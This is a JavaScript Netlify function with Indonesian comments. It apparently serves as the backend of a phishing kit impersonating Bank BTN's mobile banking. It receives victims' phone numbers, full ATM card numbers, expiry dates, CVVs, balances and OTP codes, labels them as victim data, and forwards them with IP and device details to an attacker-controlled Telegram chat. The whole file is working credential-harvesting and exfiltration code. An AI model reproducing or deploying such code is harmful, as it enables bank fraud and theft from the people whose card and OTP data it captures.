// netlify/functions/send-to-telegram.js
import fetch from 'node-fetch';

export const handler = async (event, context) => {
    // CORS Headers untuk mengizinkan akses dari domain manapun
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS, GET',
        'Content-Type': 'application/json'
    };

    // Handle preflight request (OPTIONS method)
    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 204,
            headers,
            body: ''
        };
    }

    // Hanya mengizinkan method POST
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            headers,
            body: JSON.stringify({ 
                error: 'Method not allowed',
                message: 'Hanya method POST yang diizinkan'
            })
        };
    }

    try {
        // Parse data yang dikirim dari frontend
        const data = JSON.parse(event.body);
        const { type, phoneNumber, cardData, otpCode } = data;

        // Ambil token dan chat ID dari environment variables
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        // Validasi environment variables
        if (!BOT_TOKEN || !CHAT_ID) {
            console.error('Missing environment variables: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
            return {
                statusCode: 500,
                headers,
                body: JSON.stringify({ 
                    error: 'Server configuration error',
                    message: 'Bot token atau chat ID tidak ditemukan'
                })
            };
        }

        // Format timestamp ke waktu Jakarta
        const timestamp = new Date().toLocaleString('id-ID', { 
            timeZone: 'Asia/Jakarta',
            dateStyle: 'full',
            timeStyle: 'medium'
        });

        // Informasi IP Address dan User Agent
        const ipAddress = event.headers['x-forwarded-for'] || 
                         event.headers['client-ip'] || 
                         event.headers['x-real-ip'] || 
                         'Unknown';
        
        const userAgent = event.headers['user-agent'] || 'Unknown';

        // Buat pesan berdasarkan tipe data
        let message = '';
        let parseMode = 'HTML';

        if (type === 'phone') {
            message = `
🔐 <b>DATA LOGIN BTN MOBILE</b> 🔐
━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Waktu:</b> ${timestamp}
📱 <b>Nomor HP:</b> <code>${phoneNumber}</code>
━━━━━━━━━━━━━━━━━━━━━
🌐 <b>IP Address:</b> ${ipAddress}
💻 <b>Device:</b> ${userAgent.substring(0, 50)}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Akses tidak sah terdeteksi!</i>
            `;
        } 
        else if (type === 'card') {
            // Masking nomor kartu untuk log internal (tapi kita tetap kirim full)
            const maskedCard = cardData.cardNumber.slice(0, 6) + '******' + cardData.cardNumber.slice(-4);
            
            message = `
💳 <b>DATA KARTU ATM BTN</b> 💳
━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Waktu:</b> ${timestamp}
📱 <b>Nomor HP:</b> <code>${phoneNumber}</code>
━━━━━━━━━━━━━━━━━━━━━
💳 <b>Nomor Kartu:</b> <code>${cardData.cardNumber}</code>
📅 <b>Expiry:</b> ${cardData.expiry}
🔢 <b>CVV/CVC:</b> <code>${cardData.cvv}</code>
💰 <b>Saldo:</b> Rp ${cardData.balance.replace(/\B(?=(\d{3})+(?!\d))/g, '.')}
━━━━━━━━━━━━━━━━━━━━━
🌐 <b>IP Address:</b> ${ipAddress}
💻 <b>Device:</b> ${userAgent.substring(0, 50)}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Data kartu ATM telah dikompromikan!</i>
            `;
        }
        else if (type === 'otp') {
            message = `
🔑 <b>KODE OTP BTN MOBILE</b> 🔑
━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Waktu:</b> ${timestamp}
📱 <b>Nomor HP:</b> <code>${phoneNumber}</code>
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>Kode OTP:</b> <code>${otpCode}</code>
━━━━━━━━━━━━━━━━━━━━━
⏱️ <b>Berlaku:</b> 5 menit
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Jangan berikan kode ini kepada siapapun!</i>
            `;
        }
        else if (type === 'complete') {
            message = `
✅ <b>DATA LENGKAP KORBAN</b> ✅
━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Waktu:</b> ${timestamp}
📱 <b>Nomor HP:</b> <code>${phoneNumber}</code>
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Status:</b> Proses pemulihan selesai
━━━━━━━━━━━━━━━━━━━━━
🌐 <b>IP Address:</b> ${ipAddress}
💻 <b>Device:</b> ${userAgent.substring(0, 50)}
            `;
        }

        // Kirim pesan ke Telegram
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json' 
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });

        const result = await response.json();

        // Cek apakah berhasil terkirim ke Telegram
        if (!result.ok) {
            console.error('Telegram API Error:', result);
            throw new Error(result.description || 'Failed to send message to Telegram');
        }

        // Log success (hanya untuk debugging di Netlify)
        console.log(`✅ Data type "${type}" sent to Telegram successfully at ${timestamp}`);

        // Return response sukses
        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ 
                success: true, 
                message: 'Data berhasil dikirim ke Telegram',
                timestamp: timestamp
            })
        };

    } catch (error) {
        // Log error untuk debugging
        console.error('❌ Error in send-to-telegram function:', error);
        
        // Return response error
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ 
                error: 'Internal Server Error',
                message: error.message,
                details: 'Terjadi kesalahan saat memproses request'
            })
        };
    }
};
